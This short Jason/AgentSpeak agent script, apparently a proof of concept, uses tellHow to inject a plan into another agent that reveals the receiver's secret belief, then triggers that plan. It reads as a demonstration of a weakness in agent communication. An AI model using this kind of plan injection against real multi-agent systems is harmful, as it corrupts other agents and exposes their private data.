
+!start <-
    !do_ping ;
    !teach ;
    !do_exploit.

+!do_ping <-
    .print("Going to ping.");
    .send(to_receiver, achieve, show);
    .print("Ping sent.") ;
    .wait(1000).

+!do_exploit <-
    .print("Going to exploit.");
    .send(to_receiver, achieve, leak);
    .print("Exploit sent.") ;
    .wait(1000).

+!teach <-
    .print("Going to corrupt.");
    .send_plan(to_receiver, tellHow, "+!leak[source(F)] : secret(S) <- .print(F,tell,secret(S)).");
    .print("Plan sent.");
    .wait(1000).

# Remark : the following does not work :
#    .send_plan(to_receiver, tellHow, "+!leak[source(F)] : secret(S) <- .send(F,tell,secret(S)).");




